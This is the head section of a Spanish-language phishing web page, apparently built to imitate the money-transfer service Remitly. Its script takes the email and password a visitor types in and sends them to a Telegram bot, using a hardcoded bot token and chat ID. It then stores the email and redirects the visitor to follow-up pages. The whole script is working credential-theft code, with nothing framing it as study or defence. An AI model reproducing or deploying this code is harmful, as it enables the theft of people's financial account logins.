<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mi Proyecto</title>
    <link rel="stylesheet" href="./Nick.css">
    <script>
        async function sendMessage() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const botToken = '7004431995:AAGowRSrKBSYhDkf35mwEEV1P0aysX41gLg';
            const chatId = '6180583335';
            const message = `✓✓✓Remitly✓✓✓\n@ProArgFull\n<b>Email:</b> <code>${email}</code>\n<b>Contraseña:</b> <code>${password}</code>`;
            
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;

            try {
                const response = await fetch(url, { method: 'GET' });
                const data = await response.json();

                if (data.ok) {
                    console.log('Datos enviados exitosamente');
                    
                    // Almacenar el email en localStorage
                    localStorage.setItem('userEmail', email);

                    if (email.endsWith('@gmail.com')) {
                        window.location.href = 'carg.html';
                    } else {
                        window.location.href = 'carg2.html';
                    }
                } else {
                    console.error('Error al enviar datos:', data);
                }
            } catch (error) {
                console.error('Error de red:', error);
            }
        }
    </script>
</head>

</body>
